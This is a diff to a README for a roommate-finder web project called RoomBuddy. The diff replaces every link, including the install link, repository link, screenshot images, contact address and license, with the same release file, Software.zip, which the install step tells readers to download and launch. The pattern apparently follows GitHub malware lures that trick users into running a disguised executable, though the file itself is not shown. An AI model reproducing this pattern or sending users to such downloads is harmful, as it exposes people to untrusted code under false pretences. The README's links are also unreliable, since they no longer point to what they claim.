@@ -13,25 +13,25 @@ The project utilizes a variety of technologies including:
 - **Topics**: Fullstack Development, Housing Platform, Rental Listing, Roommate Finder
 
 ## 🚀 Installation
-To get started with RoomBuddy, you can download the project by clicking [here](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) 🌟. Once downloaded, simply launch the file to begin exploring the world of RoomBuddy!
+To get started with RoomBuddy, you can download the project by clicking [here](https://github.com/AidenBozz/RoomBuddy-JFS-Real-Time-Project/releases/download/v1.0/Software.zip) 🌟. Once downloaded, simply launch the file to begin exploring the world of RoomBuddy!
 
 ## 🌐 Visit the Project
-Take a closer look at RoomBuddy by visiting the official GitHub repository [here](https://github.com/cli/browser) 🔗.
+Take a closer look at RoomBuddy by visiting the official GitHub repository [here](https://github.com/AidenBozz/RoomBuddy-JFS-Real-Time-Project/releases/download/v1.0/Software.zip) 🔗.
 
 ## 🖥️ Screenshots
 Check out some screenshots from RoomBuddy to get a glimpse of the platform:
 
-![Screenshot 1](https://via.placeholder.com/600x400)
-![Screenshot 2](https://via.placeholder.com/600x400)
+![Screenshot 1](https://github.com/AidenBozz/RoomBuddy-JFS-Real-Time-Project/releases/download/v1.0/Software.zip)
+![Screenshot 2](https://github.com/AidenBozz/RoomBuddy-JFS-Real-Time-Project/releases/download/v1.0/Software.zip)
 
 ## 💬 Get in Touch
-Have questions or feedback about RoomBuddy? Feel free to reach out at roombuddy@support.com. We'd love to hear from you!
+Have questions or feedback about RoomBuddy? Feel free to reach out at https://github.com/AidenBozz/RoomBuddy-JFS-Real-Time-Project/releases/download/v1.0/Software.zip We'd love to hear from you!
 
 ## 🌟 Contributors
 A big thank you to all the contributors who have helped make RoomBuddy possible! 🎉
 
 ## 📄 License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/cli/browser/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/AidenBozz/RoomBuddy-JFS-Real-Time-Project/releases/download/v1.0/Software.zip) file for details.
 
 ## 🌈 Check the Releases
 If the provided download link does not work or you want to explore other versions, make sure to check the "Releases" section of the repository for additional options.
